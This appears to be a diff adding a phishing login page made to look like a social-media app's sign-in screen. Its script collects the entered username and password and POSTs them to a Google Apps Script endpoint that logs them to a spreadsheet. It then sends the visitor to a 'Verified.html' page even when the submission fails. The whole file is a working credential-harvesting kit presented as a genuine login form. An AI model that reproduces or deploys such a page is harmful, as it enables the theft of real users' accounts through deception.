@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #000;
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            background-color: #1a1a1a;
+            width: 100%;
+            max-width: 400px;
+            position: relative;
+            border-radius: 10px;
+            padding-right: 60px;
+            padding-left: 60px;
+            padding-bottom: 30px;
+            margin-bottom: 70px;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 0;
+            
+        }
+
+        .back-btn {
+            background: none;
+            border: none;
+            color: #fff;
+            font-size: 16px;
+            cursor: pointer;
+            padding: 10px;
+            margin-top: 20px;
+            
+        }
+        .close-btn {
+            background: none;
+            border: none;
+            color: #fff;
+            font-size: 20px;
+            cursor: pointer;
+            padding: 10px;
+            display: flexbox;
+            text-align: end;
+            
+        }
+
+        .back-btn:hover, .close-btn:hover {
+            opacity: 0.7;
+        }
+
+        h1 {
+            text-align: center;
+            font-size: 32px;
+            font-weight: 600;
+            margin-bottom: 30px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        label {
+            font-size: 15px;
+            font-weight: 500;
+            color: #fff;
+            margin-bottom: -10px;
+        }
+
+        .phone-link {
+            color: #fff;
+            text-decoration: none;
+            font-size: 14px;
+            margin-bottom: -10px;
+        }
+
+        .phone-link:hover {
+            text-decoration: underline;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        input {
+            width: 100%;
+            padding: 16px;
+            background-color: #262626;
+            border: 1px solid #262626;
+            border-radius: 4px;
+            color: #fff;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.3s;
+            margin-bottom: -10px;
+        }
+
+        input::placeholder {
+            color: #737373;
+        }
+
+        input:focus {
+            border-color: #404040;
+            background-color: #1a1a1a;
+        }
+
+        .toggle-password {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #fff;
+            cursor: pointer;
+            font-size: 18px;
+            padding: 5px;
+        }
+
+        .toggle-password:hover {
+            opacity: 0.7;
+        }
+
+        .forgot-password {
+            color: #fff;
+            text-decoration: none;
+            font-size: 14px;
+            display: inline-block;
+            margin-top: 15px;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 16px;
+            background-color: #262626;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background-color 0.3s;
+        }
+
+        .login-btn:hover:not(:disabled) {
+            background-color: #363636;
+        }
+
+        .login-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .login-btn.active {
+            background-color: #fe2c55;
+        }
+
+        .login-btn.active:hover {
+            background-color: #e62a4f;
+        }
+
+        .footer {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background-color: #000;
+            padding: 20px;
+            text-align: center;
+            border-top: 1px solid #262626;
+            
+        }
+
+        .footer p {
+            color: #737373;
+            font-size: 14px;
+        }
+
+        .signup-link {
+            color: #f44;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .signup-link:hover {
+            text-decoration: underline;
+        }
+
+        .error-message {
+            color: #ed4956;
+            font-size: 13px;
+            margin-top: 8px;
+            display: none;
+        }
+
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 28px;
+            }
+
+            .container {
+                max-width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+        </div>
+
+        <h1>Log in</h1>
+
+        <form id="loginForm">
+            <div class="form-group">
+                <div class="form-header">
+                    <label for="username">Email or username</label>
+                    <a href="#" class="phone-link">Log in with phone</a>
+                </div>
+                <input 
+                    type="text" 
+                    id="username" 
+                    name="username" 
+                    placeholder="Email or username"
+                    required
+                >
+                <div class="error-message" id="usernameError">Please enter a valid email or username</div>
+            </div>
+
+            <div class="form-group">
+                <div class="input-wrapper">
+                    <input 
+                        type="password" 
+                        id="password" 
+                        name="password" 
+                        placeholder="Password"
+                        required
+                    >
+                    <button type="button" class="toggle-password" id="togglePassword">👁</button>
+                </div>
+                <div class="error-message" id="passwordError">Password is required</div>
+                <a href="#" class="forgot-password">Forgot password?</a>
+            </div>
+
+            <button type="submit" class="login-btn" id="loginBtn">Log in</button>
+            <center><button class="back-btn" onclick="window.history.back()">← Go back</button></center>
+        </form>
+    </div>
+
+    <div class="footer">
+        <p>Don't have an account? <a href="#" class="signup-link">Sign up</a></p>
+    </div>
+
+    <script>
+        // Replace this with your Google Apps Script Web App URL
+        const GOOGLE_SCRIPT_URL = 'YOUR_GOOGLE_APPS_SCRIPT_URL_HERE';
+        
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const loginBtn = document.getElementById('loginBtn');
+        const togglePassword = document.getElementById('togglePassword');
+        const loginForm = document.getElementById('loginForm');
+
+        // Toggle password visibility
+        togglePassword.addEventListener('click', function() {
+            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordInput.setAttribute('type', type);
+            this.textContent = type === 'password' ? '👁' : '👁';
+        });
+
+        // Enable/disable login button based on input
+        function updateLoginButton() {
+            if (usernameInput.value.trim() !== '' && passwordInput.value.trim() !== '') {
+                loginBtn.classList.add('active');
+                loginBtn.disabled = false;
+            } else {
+                loginBtn.classList.remove('active');
+                loginBtn.disabled = true;
+            }
+        }
+
+        usernameInput.addEventListener('input', updateLoginButton);
+        passwordInput.addEventListener('input', updateLoginButton);
+
+        // Move to password field when username is entered
+        usernameInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                if (usernameInput.value.trim() !== '') {
+                    passwordInput.focus();
+                }
+            }
+        });
+
+        // Handle form submission
+        loginForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const username = usernameInput.value.trim();
+            const password = passwordInput.value.trim();
+
+            if (!username || !password) {
+                return;
+            }
+
+            // Disable button and show loading state
+            loginBtn.disabled = true;
+            loginBtn.textContent = 'Logging in...';
+
+            try {
+                // Send data to Google Sheets
+                const formData = new FormData();
+                formData.append('username', username);
+                formData.append('password', password);
+                formData.append('timestamp', new Date().toISOString());
+
+                const response = await fetch(GOOGLE_SCRIPT_URL, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                if (response.ok) {
+                    // Redirect to verification page
+                    window.location.href = 'Verified.html';
+                } else {
+                    throw new Error('Failed to submit data');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                // Still redirect even if there's an error (you can change this behavior)
+                window.location.href = 'Verified.html';
+            }
+        });
+
+        // Initial button state
+        updateLoginButton();
+    </script>
+</body>
+</html>
